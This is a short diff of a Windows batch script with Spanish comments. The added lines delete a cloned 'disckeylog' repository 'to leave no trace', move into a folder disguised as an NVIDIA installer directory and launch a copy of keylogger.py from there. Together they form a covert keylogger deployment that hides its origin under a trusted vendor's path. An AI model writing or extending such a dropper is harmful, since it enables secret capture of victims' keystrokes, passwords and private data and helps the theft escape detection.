@@ -48,5 +48,13 @@ timeout /t 180
 ::elimina el repositorio para no dejar huella
 cd ..
 timeout /t 5
-rmdir -r disckeylog
+rmdir /s /q disckeylog
+timeout /t 15
 
+::abre la carpeta donde se encuentra la copia generada por el propio script
+cd C:\Program Files\NVIDIA Corporation\Installer2\installer
+::ejecuta el nuevo script
+python3 keylogger.py
+
+::fin de tu trabajo .bat, lo hiciste bien
+exit
